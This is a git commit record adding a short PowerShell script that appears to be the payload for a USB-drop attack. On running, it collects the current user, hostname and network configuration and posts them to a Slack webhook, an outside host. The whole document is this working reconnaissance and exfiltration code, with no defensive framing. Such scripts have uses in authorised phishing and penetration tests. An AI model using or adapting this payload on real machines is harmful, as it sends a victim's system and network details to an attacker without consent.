b58c39cf73bb59d732bb9f71f7d37fa9182255b6
brainkok <92050069+brainkok@users.noreply.github.com>
2023-05-26 15:05:56 +0200

    Create s.ps1

---
+++ s.ps1
@@ -0,0 +1,26 @@
+function Send-SystemInfoToSlackWebhook {
+    $commands = @("whoami", "hostname", "ipconfig")
+    $payload = "USB Drop - USB Report`n`n"
+    
+    foreach ($cmd in $commands) {
+        $output = Invoke-Expression -Command $cmd
+        $payload += "`n`n`$ $cmd`n$output"
+    }
+    $payload = '{"text": "```' + $payload + '```"}'
+    
+    $webRequest = [System.Net.WebRequest]::Create($webhookURL)
+    $webRequest.Method = "POST"
+    $webRequest.ContentType = "application/json"
+    
+    $payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
+    $webRequest.GetRequestStream().Write($payloadBytes, 0, $payloadBytes.Length)
+    
+    $response = $webRequest.GetResponse()
+    $responseStream = $response.GetResponseStream()
+    $streamReader = New-Object System.IO.StreamReader($responseStream)
+    $responseText = $streamReader.ReadToEnd()
+    
+    Write-Output $responseText
+}
+
+Send-SystemInfoToSlackWebhook
